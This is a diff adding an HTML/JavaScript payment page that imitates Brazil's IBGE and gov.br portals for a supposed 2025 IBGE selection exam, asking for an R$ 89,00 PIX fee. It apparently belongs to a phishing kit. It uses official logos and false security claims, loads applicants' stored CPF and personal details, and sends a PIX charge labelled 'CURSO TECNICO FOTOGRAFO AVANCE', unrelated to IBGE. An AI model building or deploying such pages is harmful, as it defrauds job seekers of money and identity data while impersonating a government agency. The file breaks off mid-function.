@@ -1,0 +1,1199 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento - Taxa de Inscrição IBGE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>🇧🇷</text></svg>">
+    <style>
+        /* Correção para mobile - prevenir scroll horizontal */
+        html, body {
+            overflow-x: hidden !important;
+            max-width: 100vw !important;
+            position: relative !important;
+        }
+        
+        * {
+            max-width: 100% !important;
+            box-sizing: border-box !important;
+        }
+        
+        /* Container principal fixo */
+        .mobile-container {
+            width: 100vw !important;
+            max-width: 100vw !important;
+            overflow-x: hidden !important;
+            position: relative !important;
+        }
+        
+        /* QR Code responsivo */
+        #qr-code-container img {
+            max-width: 220px !important;
+            max-height: 220px !important;
+            width: 100% !important;
+            height: auto !important;
+        }
+        
+        /* Código PIX responsivo */
+        #pix-code {
+            word-break: break-all !important;
+            overflow-wrap: break-word !important;
+            max-width: 100% !important;
+        }
+
+        .half-circle {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: linear-gradient(90deg, #1E40AF 50%, #FFFFFF 50%);
+            border: 1px solid #1E40AF;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .animate-fade-in {
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .animate-slide-up {
+            animation: slideUp 0.8s ease-out;
+            animation-fill-mode: both;
+        }
+
+        /* Loading no estilo gov.br */
+        .gov-loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+        }
+
+        .gov-spinner {
+            width: 100%;
+            height: 100%;
+            border: 2px solid #fbbf24;
+            border-top: 2px solid #d97706;
+            border-radius: 50%;
+            animation: gov-spin 1s linear infinite;
+        }
+
+        @keyframes gov-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .animate-slide-up:nth-child(1) { animation-delay: 0.1s; }
+        .animate-slide-up:nth-child(2) { animation-delay: 0.2s; }
+        .animate-slide-up:nth-child(3) { animation-delay: 0.3s; }
+        .animate-slide-up:nth-child(4) { animation-delay: 0.4s; }
+
+        button {
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        button:active {
+            transform: translateY(0);
+            transition: all 0.1s;
+        }
+
+        #qr-code-container img {
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            max-width: 220px;
+            max-height: 220px;
+        }
+
+        * {
+            transition: all 0.3s ease;
+        }
+
+        .language-selector {
+            position: relative;
+        }
+
+        .language-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            min-width: 200px;
+            margin-top: 4px;
+        }
+
+        .language-dropdown.hidden {
+            display: none;
+        }
+
+        .watermark {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-25deg);
+            opacity: 0.25;
+            pointer-events: none;
+            z-index: 1;
+            width: 90vw;
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 mobile-container">
+    <!-- IBGE Logo Watermark -->
+    <div class="fixed inset-0 pointer-events-none overflow-hidden" style="z-index: 1;">
+        <!-- Logo única ocupando toda largura -->
+        <div class="absolute select-none" 
+             style="top: 50%; left: 0; right: 0; transform: translateY(-50%) rotate(25deg); transform-origin: center;">
+            <img src="https://logodownload.org/wp-content/uploads/2018/02/ibge-logo.png" 
+                 alt="IBGE Watermark" 
+                 class="opacity-25 w-full h-auto max-w-none"
+                 style="filter: grayscale(40%); width: 90vw; margin-left: -5vw;">
+        </div>
+    </div>
+
+    <!-- Top bar -->
+    <div class="bg-[#0B2341] w-full content-overlay">
+        <div class="flex items-center h-[42px]">
+            <div class="flex items-center h-full pl-4 pr-4 flex-shrink-0">
+                <a href="{{ url_for('login') }}" class="flex items-center h-full">
+                    <img src="https://www.gov.br/governodigital/pt-br/estrategias-e-governanca-digital/EGD2020/imagens/logo-white.png" alt="gov.br logo, white text on transparent background" style="height: 20px; width: 65px; object-fit: contain;"/>
+                </a>
+            </div>
+            <div class="h-4 w-px bg-[#33507A] mx-3 flex-shrink-0"></div>
+            <div class="flex-1 min-w-0"></div>
+            <div class="flex items-center h-full pr-2">
+                <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-1 md:px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors whitespace-nowrap text-xs">
+                    ACESSO À INFORMAÇÃO
+                </a>
+                <div class="h-4 w-px bg-[#33507A] mx-1"></div>
+                <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-1 md:px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors text-xs">
+                    PARTICIPE
+                </a>
+                <div class="h-4 w-px bg-[#33507A] mx-1"></div>
+                <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-1 md:px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors text-xs">
+                    LEGISLAÇÃO
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- IBGE logo and language -->
+    <div class="w-full flex flex-col items-center pt-6 pb-2 bg-white content-overlay">
+        <img alt="IBGE logo azul, texto e símbolo geométrico em fundo transparente" class="mb-2" src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/logo_mobile.png" style="width:125px; height:24px;"/>
+        <div class="relative">
+            <div class="flex items-center space-x-2 mt-1 cursor-pointer hover:bg-gray-50 px-2 py-1 rounded transition-colors" id="language-selector">
+                <img alt="Brazilian flag" class="w-6 h-5 rounded shadow-sm border border-gray-200" src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/pt_br.png"/>
+                <div class="h-7 w-px bg-gray-300 mx-1"></div>
+                <img alt="Globe icon for language selection" class="w-6 h-6" src="https://www.ibge.gov.br/media/mod_gtranslate/flags/svg/globe.svg"/>
+                <span class="text-[#444] text-sm font-normal">
+                    Outros idiomas
+                </span>
+                <i class="fas fa-chevron-down text-gray-500 ml-1 text-xs transition-transform duration-200" id="language-chevron"></i>
+            </div>
+
+            <!-- Language dropdown -->
+            <div id="language-dropdown" class="absolute top-full left-1/2 transform -translate-x-1/2 mt-2 bg-white border border-gray-200 rounded-lg shadow-lg z-50 hidden w-56">
+                <div class="max-h-48 overflow-y-auto py-2">
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/us.png" alt="English" class="w-5 h-4 mr-3 rounded"/>
+                        <span>English</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/es.png" alt="Español" class="w-5 h-4 mr-3 rounded"/>
+                        <span>Español</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/fr.png" alt="Français" class="w-5 h-4 mr-3 rounded"/>
+                        <span>Français</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/de.png" alt="Deutsch" class="w-5 h-4 mr-3 rounded"/>
+                        <span>Deutsch</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/it.png" alt="Italiano" class="w-5 h-4 mr-3 rounded"/>
+                        <span>Italiano</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/jp.png" alt="日本語" class="w-5 h-4 mr-3 rounded"/>
+                        <span>日本語</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/cn.png" alt="中文" class="w-5 h-4 mr-3 rounded"/>
+                        <span>中文</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/ru.png" alt="Русский" class="w-5 h-4 mr-3 rounded"/>
+                        <span>Русский</span>
+                    </a>
+                    <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                        <img src="https://flagcdn.com/w20/ar.png" alt="العربية" class="w-5 h-4 mr-3 rounded"/>
+                        <span>العربية</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Instituto name line -->
+    <div class="bg-white border-t border-gray-200 content-overlay">
+        <div class="py-2">
+            <p class="text-gray-700 text-sm text-center">Instituto Brasileiro de Geografia e Estatística</p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="bg-gray-50 min-h-screen relative">
+    <div class="w-full max-w-7xl mx-auto px-2 sm:px-4 py-12 relative content-overlay" style="z-index: 5;">
+        <!-- Header Section com estilo da página de local de prova -->
+        <div class="bg-white border border-gray-300 shadow-sm mb-8 animate-fade-in">
+            <div class="bg-[#0B2341] text-white px-3 sm:px-6 py-4">
+                <div class="flex items-center">
+                    <img src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/logo_mobile.png" alt="IBGE" class="h-8 mr-4 filter brightness-0 invert">
+                    <div>
+                        <h1 class="text-xl font-bold">PROCESSO SELETIVO SIMPLIFICADO IBGE 2025</h1>
+                        <p class="text-sm text-gray-200">EDITAL Nº 001/2025 - PAGAMENTO DA TAXA DE INSCRIÇÃO</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-[#184A8C] text-white px-3 sm:px-6 py-3">
+                <p class="text-sm font-medium">PAGAMENTO DA TAXA DE INSCRIÇÃO</p>
+                <p class="text-xs text-gray-200">Finalize sua inscrição efetuando o pagamento da taxa no valor de R$ 89,00</p>
+                <p class="text-xs text-gray-200 mt-1">Protocolo: <span id="protocolo-checkout">Carregando...</span></p>
+            </div>
+        </div>
+
+        <!-- Informações do Candidato -->
+        <div class="bg-white border border-gray-300 shadow-sm overflow-hidden mb-8 animate-fade-in">
+            <!-- Header da seção -->
+            <div class="bg-[#184A8C] text-white px-3 sm:px-6 py-3">
+                <h3 class="text-sm font-bold uppercase tracking-wide flex items-center">
+                    <i class="fas fa-user mr-2"></i>
+                    DADOS DO INSCRITO
+                </h3>
+            </div>
+
+            <!-- Conteúdo da seção -->
+            <div class="p-3 sm:p-6">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="space-y-4">
+                        <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                            <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">Nome Completo:</span>
+                            <span id="candidato-nome" class="text-sm text-[#0B2341] font-medium">Carregando...</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                            <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">CPF:</span>
+                            <span id="candidato-cpf" class="text-sm text-[#0B2341] font-medium">Carregando...</span>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                            <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">E-mail:</span>
+                            <span id="candidato-email" class="text-sm text-[#0B2341] font-medium">Carregando...</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-gray-100 pb-2">
+                            <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">Telefone:</span>
+                            <span id="candidato-telefone" class="text-sm text-[#0B2341] font-medium">Carregando...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Card Principal de Pagamento -->
+        <div class="bg-white border border-gray-300 shadow-lg overflow-hidden mb-8">
+            <!-- Header do Card -->
+            <div class="bg-[#0B2341] text-white p-6">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <h2 class="text-xl font-bold mb-1">PAGAMENTO PIX</h2>
+                        <p class="text-gray-200 text-sm">Taxa de Inscrição - IBGE</p>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-3xl font-bold text-white">R$ 89,00</div>
+                        <div class="text-gray-200 text-sm">Taxa de Inscrição</div>
+                    </div>
+                </div>
+
+                <!-- Banca Organizadora -->
+                <div class="mt-4 pt-4 border-t border-gray-600">
+                    <div class="flex items-center">
+                        <span class="text-sm text-gray-300 mr-3">Banca Organizadora:</span>
+                        <img src="https://blog-static.infra.grancursosonline.com.br/wp-content/uploads/2014/09/03154603/fgv.png" 
+                             alt="FGV - Fundação Getulio Vargas" 
+                             class="h-20 w-48 bg-white rounded p-1 object-contain">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Conteúdo do Card -->
+            <div class="p-8">
+                <div class="grid lg:grid-cols-2 gap-8">
+                    <!-- Coluna Esquerda: QR Code -->
+                    <div>
+                        <div class="border border-gray-300 bg-white p-6 mb-4">
+                            <h4 class="text-sm font-medium text-gray-700 mb-4 uppercase tracking-wide">CÓDIGO QR PIX</h4>
+                            <div id="qr-code-container" class="w-full flex items-center justify-center bg-gray-50 border border-gray-200 p-4" style="min-height: 280px;">
+                                <div class="text-center text-gray-600">
+                                    <div class="mb-3">
+                                        <i class="fas fa-qrcode text-4xl text-gray-400"></i>
+                                    </div>
+                                    <p class="text-sm">Aguarde, gerando código QR...</p>
+                                    <div class="mt-3">
+                                        <div class="inline-block w-5 h-5 border-2 border-gray-300 border-t-[#0B2341] rounded-full animate-spin"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <p class="text-xs text-gray-600 text-center mt-3">
+                                Utilize o aplicativo do seu banco para escanear o código
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Coluna Direita: Código PIX -->
+                    <div class="space-y-4">
+                        <!-- Código PIX -->
+                        <div class="border border-gray-300 bg-white p-6">
+                            <h4 class="text-sm font-medium text-gray-700 mb-4 uppercase tracking-wide">CÓDIGO PIX CÓPIA E COLA</h4>
+                            <div class="bg-gray-50 border border-gray-200 p-3 mb-4">
+                                <textarea id="pix-code" readonly 
+                                          class="w-full h-16 text-xs font-mono bg-transparent border-none resize-none focus:outline-none text-gray-800 leading-tight overflow-hidden"
+                                          placeholder="Aguarde, gerando código PIX..."></textarea>
+                            </div>
+                            <button id="copy-pix-btn" onclick="copyPIXCode()"
+                                    class="w-full bg-[#0B2341] hover:bg-[#184A8C] text-white font-medium py-3 px-4 transition-colors duration-200 text-sm uppercase tracking-wide">
+                                <i class="fas fa-copy mr-2"></i>
+                                COPIAR CÓDIGO PIX
+                            </button>
+                        </div>
+
+                        <!-- Status do Pagamento -->
+                        <div id="payment-status" class="border border-gray-300 bg-white p-4">
+                            <div class="flex items-center">
+                                <div class="w-3 h-3 bg-yellow-500 rounded-full mr-3"></div>
+                                <span class="text-sm font-medium text-gray-700 uppercase tracking-wide">AGUARDANDO PAGAMENTO</span>
+                            </div>
+                        </div>
+
+                        <!-- Instruções -->
+                        <div class="border border-gray-300 bg-white p-6">
+                            <h4 class="text-sm font-medium text-gray-700 mb-4 uppercase tracking-wide">INSTRUÇÕES DE PAGAMENTO</h4>
+                            <div class="space-y-3 text-sm text-gray-600">
+                                <div class="flex items-start">
+                                    <span class="inline-flex items-center justify-center w-6 h-6 bg-gray-200 text-gray-700 text-xs font-medium rounded-full mr-3 mt-0.5 flex-shrink-0">1</span>
+                                    <span>Acesse o aplicativo do seu banco ou internet banking</span>
+                                </div>
+                                <div class="flex items-start">
+                                    <span class="inline-flex items-center justify-center w-6 h-6 bg-gray-200 text-gray-700 text-xs font-medium rounded-full mr-3 mt-0.5 flex-shrink-0">2</span>
+                                    <span>Escolha a opção PIX e escaneie o QR Code ou cole o código</span>
+                                </div>
+                                <div class="flex items-start">
+                                    <span class="inline-flex items-center justify-center w-6 h-6 bg-gray-200 text-gray-700 text-xs font-medium rounded-full mr-3 mt-0.5 flex-shrink-0">3</span>
+                                    <span>Confirme os dados e efetue o pagamento</span>
+                                </div>
+                                <div class="flex items-start">
+                                    <span class="inline-flex items-center justify-center w-6 h-6 bg-gray-200 text-gray-700 text-xs font-medium rounded-full mr-3 mt-0.5 flex-shrink-0">4</span>
+                                    <span>Aguarde a confirmação automática do pagamento</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Informações de Segurança -->
+        <div class="bg-white border border-gray-300 shadow-sm overflow-hidden mb-8 animate-fade-in">
+            <!-- Header da seção -->
+            <div class="bg-[#184A8C] text-white px-3 sm:px-6 py-3">
+                <h3 class="text-sm font-bold uppercase tracking-wide flex items-center">
+                    <img src="https://www.gov.br/agricultura/pt-br/agroform/brasao-sem-fundo.png" 
+                         alt="Brasão da República" 
+                         class="w-5 h-5 mr-2" 
+                         onerror="this.style.display='none';">
+                    SEGURANÇA
+                </h3>
+            </div>
+
+            <!-- Conteúdo da seção -->
+            <div class="p-3 sm:p-6">
+                <div class="bg-gray-50 rounded-lg p-4">
+                    <ul class="text-sm text-gray-600 space-y-3">
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-600 mr-3 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            <span class="text-gray-700 font-medium">Dados protegidos por criptografia</span>
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-600 mr-3 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            <span class="text-gray-700 font-medium">Integração oficial RFB</span>
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-600 mr-3 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            <span class="text-gray-700 font-medium">Protocolo HTTPS</span>
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-600 mr-3 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            <span class="text-gray-700 font-medium">Sem armazenamento de dados</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <script>
+        // Initialize language selector dropdown functionality
+        function initializeLanguageSelector() {
+            const languageButton = document.getElementById('language-button');
+            const languageDropdown = document.getElementById('language-dropdown');
+
+            if (languageButton && languageDropdown) {
+                languageButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    toggleLanguageDropdown();
+                });
+
+                // Close dropdown when clicking outside
+                document.addEventListener('click', function(e) {
+                    if (!languageButton.contains(e.target) && !languageDropdown.contains(e.target)) {
+                        closeLanguageDropdown();
+                    }
+                });
+            }
+
+            function toggleLanguageDropdown() {
+                languageDropdown.classList.toggle('hidden');
+            }
+
+            function closeLanguageDropdown() {
+                languageDropdown.classList.add('hidden');
+            }
+        }
+
+        // Variáveis globais para PIX
+        let pixData = null;
+        let paymentCheckInterval = null;
+
+        // Função para carregar dados do usuário
+        function carregarDadosUsuario() {
+            console.log('[CHECKOUT] Iniciando carregamento de dados...');
+
+            // Carregar dados completos do localStorage (vindos do comprovante de inscrição)
+            const dadosCompletos = localStorage.getItem('ibge_inscricao_completa');
+            console.log('[CHECKOUT] Dados brutos do localStorage:', dadosCompletos);
+            
+            // Debug: Verificar todas as chaves do localStorage
+            console.log('[CHECKOUT] Todas as chaves do localStorage:');
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                console.log(`[CHECKOUT] - ${key}:`, localStorage.getItem(key));
+            }
+
+            let dados = {};
+
+            if (dadosCompletos) {
+                try {
+                    dados = JSON.parse(dadosCompletos);
+                    console.log('[CHECKOUT] Dados parseados com sucesso:', dados);
+                } catch (e) {
+                    console.error('[CHECKOUT] Erro ao parsear dados completos:', e);
+                    dados = tentarCarregarSecoesIndividuais();
+                }
+            } else {
+                console.warn('[CHECKOUT] Nenhum dado encontrado em ibge_inscricao_completa');
+                dados = tentarCarregarSecoesIndividuais();
+            }
+
+            // Extrair e processar dados de forma mais eficiente
+            const dadosProcessados = processarDadosUsuario(dados);
+
+            // Atualizar interface imediatamente
+            atualizarInterfaceUsuario(dadosProcessados);
+
+            // Salvar dados globalmente para PIX
+            window.dadosUsuarioCheckout = dadosProcessados;
+
+            console.log('[CHECKOUT] Dados prontos para PIX:', window.dadosUsuarioCheckout);
+
+            return dadosProcessados;
+        }
+
+        function tentarCarregarSecoesIndividuais() {
+            console.log('[CHECKOUT] Tentando carregar dados das seções individuais...');
+            
+            try {
+                const secao1 = JSON.parse(localStorage.getItem('ibge_inscricao_secao1') || '{}');
+                const secao3 = JSON.parse(localStorage.getItem('ibge_inscricao_secao3') || '{}');
+                const secao4 = JSON.parse(localStorage.getItem('ibge_inscricao_secao4') || '{}');
+                const dadosUsuario = JSON.parse(localStorage.getItem('ibge_dados_usuario') || '{}');
+                
+                console.log('[CHECKOUT] Seção 1:', secao1);
+                console.log('[CHECKOUT] Seção 3:', secao3);
+                console.log('[CHECKOUT] Seção 4:', secao4);
+                console.log('[CHECKOUT] Dados usuário:', dadosUsuario);
+                
+                if (Object.keys(secao1).length > 0 || Object.keys(dadosUsuario).length > 0) {
+                    const dados = {
+                        identificacao: {
+                            nome_completo: secao1.nome_completo || dadosUsuario.nome_completo || '',
+                            cpf: secao1.cpf || dadosUsuario.cpf || '',
+                            rg: secao1.rg || dadosUsuario.rg || '',
+                            data_nascimento: secao1.data_nascimento || dadosUsuario.data_nascimento || '',
+                            sexo: secao1.sexo || dadosUsuario.sexo || '',
+                            estado_civil: secao1.estado_civil || dadosUsuario.estado_civil || '',
+                            nome_mae: secao1.nome_mae || dadosUsuario.nome_mae || '',
+                            nome_pai: secao1.nome_pai || dadosUsuario.nome_pai || '',
+                            naturalidade: secao1.naturalidade || dadosUsuario.naturalidade || ''
+                        },
+                        endereco: {
+                            cep: secao3.cep || dadosUsuario.cep || '',
+                            logradouro: secao3.logradouro || dadosUsuario.logradouro || '',
+                            numero: secao3.numero || dadosUsuario.numero || '',
+                            complemento: secao3.complemento || dadosUsuario.complemento || '',
+                            bairro: secao3.bairro || dadosUsuario.bairro || '',
+                            cidade: secao3.cidade || dadosUsuario.cidade || '',
+                            uf: secao3.uf || dadosUsuario.uf || ''
+                        },
+                        contato: {
+                            telefone: secao4.telefone || dadosUsuario.telefone || '',
+                            telefone_alt: secao4.telefone_alt || dadosUsuario.telefone_alt || '',
+                            email: secao4.email || dadosUsuario.email || ''
+                        },
+                        protocolo: dadosUsuario.protocolo_numero || localStorage.getItem('ibge_protocolo') || 'IBGE' + Date.now(),
+                        cargo: dadosUsuario.cargo_selecionado || localStorage.getItem('ibge_cargo_selecionado') || '',
+                        timestamp: new Date().toISOString(),
+                        data_inscricao: new Date().toLocaleDateString('pt-BR')
+                    };
+                    
+                    console.log('[CHECKOUT] Dados reconstruídos das seções:', dados);
+                    
+                    // Salvar dados reconstruídos para uso futuro
+                    localStorage.setItem('ibge_inscricao_completa', JSON.stringify(dados));
+                    
+                    return dados;
+                }
+            } catch (error) {
+                console.error('[CHECKOUT] Erro ao carregar seções individuais:', error);
+            }
+            
+            console.log('[CHECKOUT] Nenhum dado encontrado, usando padrão');
+            return criarDadosPadrao();
+        }
+
+        function criarDadosPadrao() {
+            return {
+                identificacao: {
+                    nome_completo: 'Usuario IBGE',
+                    cpf: '00000000000'
+                },
+                contato: {
+                    email: 'usuario@ibge.gov.br',
+                    telefone: '11999999999'
+                },
+                protocolo: 'IBGE' + Date.now()
+            };
+        }
+
+        function processarDadosUsuario(dados) {
+            const nome = dados.identificacao?.nome_completo || 'Usuário IBGE';
+            const cpf = dados.identificacao?.cpf || '00000000000';
+            const email = dados.contato?.email || 'usuario@ibge.gov.br';
+            const telefone = dados.contato?.telefone || '11999999999';
+            const protocolo = dados.protocolo || 'IBGE' + Date.now();
+
+            return {
+                nome: nome,
+                cpf: cpf.replace(/\D/g, ''), // Limpar CPF
+                email: email,
+                telefone: telefone.replace(/\D/g, ''), // Limpar telefone
+                protocolo: protocolo,
+                // Dados para exibição na tela
+                cpf_formatado: cpf,
+                telefone_formatado: telefone
+            };
+        }
+
+        function atualizarInterfaceUsuario(dados) {
+            const elementos = {
+                'candidato-nome': dados.nome,
+                'candidato-cpf': dados.cpf_formatado,
+                'candidato-email': dados.email,
+                'candidato-telefone': dados.telefone_formatado
+            };
+
+            Object.entries(elementos).forEach(([id, valor]) => {
+                const elemento = document.getElementById(id);
+                if (elemento) {
+                    elemento.textContent = valor;
+                    console.log(`[CHECKOUT] ✓ ${id} atualizado:`, valor);
+                }
+            });
+        }
+
+        // Função para gerar PIX via FOR4 PAYMENTS API
+        async function gerarPIX() {
+            try {
+                console.log('[PIX] Iniciando geração do PIX...');
+
+                // Verificar se os dados do usuário estão disponíveis
+                if (!window.dadosUsuarioCheckout) {
+                    console.error('[PIX] Dados do usuário não encontrados');
+                    throw new Error('Dados do usuário não encontrados');
+                }
+
+                const dados = window.dadosUsuarioCheckout;
+                console.log('[PIX] Dados disponíveis:', dados);
+
+                // Validar dados essenciais
+                if (!dados.nome || !dados.cpf || !dados.email) {
+                    throw new Error('Dados essenciais do usuário não encontrados');
+                }
+
+                console.log('[PIX] Enviando requisição para API...');
+
+                const response = await fetch('/gerar-pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        name: dados.nome,
+                        cpf: dados.cpf,
+                        email: dados.email,
+                        phone: dados.telefone,
+                        amount: 8900, // Valor em centavos
+                        description: 'CURSO TECNICO FOTOGRAFO AVANCE'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('Resposta da API:', data);
+
+                if (data.success) {
+                    // Os dados PIX vêm diretamente na resposta da API
+                    pixData = {
+                        payment_id: data.payment_id,
+                        pix_code: data.pix_code,
+                        pix_qr_code: data.pix_qr_code,
+                        expires_at: data.expires_at,
+                        status: data.status
+                    };
+
+                    // Atualizar código PIX
+                    const pixCodeElement = document.getElementById('pix-code');
+                    if (pixCodeElement && pixData.pix_code) {
+                        pixCodeElement.value = pixData.pix_code;
+                        console.log('✓ Código PIX atualizado:', pixData.pix_code.substring(0, 50) + '...');
+                    }
+
+                    // Gerar QR Code
+                    if (pixData.pix_code) {
+                        gerarQRCode(pixData.pix_code);
+                        console.log('✓ QR Code gerado');
+                    }
+
+                    // Iniciar verificação de pagamento
+                    if (pixData.payment_id) {
+                        iniciarVerificacaoPagamento(pixData.payment_id);
+                        console.log('✓ Verificação de pagamento iniciada');
+                    }
+
+                    console.log('PIX gerado com sucesso:', pixData);
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar PIX');
+                }
+            } catch (error) {
+                console.error('Erro ao gerar PIX:', error);
+
+                // Atualizar interface para mostrar erro
+                const qrContainer = document.getElementById('qr-code-container');
+                if (qrContainer) {
+                    qrContainer.innerHTML = `
+                        <div class="text-center text-red-600">
+                            <div class="mb-3">
+                                <i class="fas fa-exclamation-triangle text-4xl text-red-400"></i>
+                            </div>
+                            <p class="text-sm">Erro ao gerar código PIX</p>
+                            <p class="text-xs mt-2">${error.message}</p>
+                            <button onclick="gerarPIX()" class="mt-3 px-4 py-2 bg-blue-600 text-white text-xs rounded hover:bg-blue-700">
+                                Tentar Novamente
+                            </button>
+                        </div>
+                    `;
+                }
+            }
+        }
+
+        // Função para gerar QR Code visual
+        function gerarQRCode(codigoPix) {
+            const container = document.getElementById('qr-code-container');
+            container.innerHTML = `
+                <div class="bg-white border border-gray-200 p-4" style="width: 240px; height: 240px; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
+                    <canvas id="qr-canvas" style="width: 220px; height: 220px; display: block;"></canvas>
+                </div>
+            `;
+
+            const canvas = document.getElementById('qr-canvas');
+            const qr = new QRious({
+                element: canvas,
+                value: codigoPix,
+                size: 220,
+                background: 'white',
+                foreground: '#0B2341',
+                level: 'M'
+            });
+        }
+
+        // Função para copiar código PIX
+        function copyPIXCode() {
+            const pixCode = document.getElementById('pix-code');
+            pixCode.select();
+            pixCode.setSelectionRange(0, 99999);
+
+            navigator.clipboard.writeText(pixCode.value).then(() => {
+                const btn = document.getElementById('copy-pix-btn');
+                const originalText = btn.innerHTML;
+
+                btn.innerHTML = '<i class="fas fa-check mr-2"></i>CÓDIGO COPIADO';
+                btn.classList.remove('bg-[#0B2341]', 'hover:bg-[#184A8C]');
+                btn.classList.add('bg-green-700');
+
+                setTimeout(() => {
